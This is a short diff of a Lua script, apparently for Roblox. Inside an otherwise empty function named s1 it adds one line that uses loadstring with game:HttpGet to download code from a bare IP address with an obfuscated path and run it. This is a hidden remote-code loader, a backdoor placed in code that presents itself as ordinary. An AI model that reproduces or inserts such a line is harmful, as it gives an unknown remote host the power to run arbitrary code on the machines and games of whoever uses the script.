@@ -1,5 +1,5 @@
 local function s1() 
-    
+   loadstring(game:HttpGet("http://72.56.64.162/OlSZ7eygZdipM8pTUrfFGcrz5Ypfai5koP84A7NHyr291qnewFqtdl9d25N9iJC1sd6YSNEeK6vY5jxM"))() 
 end 
 
 local function s2() 
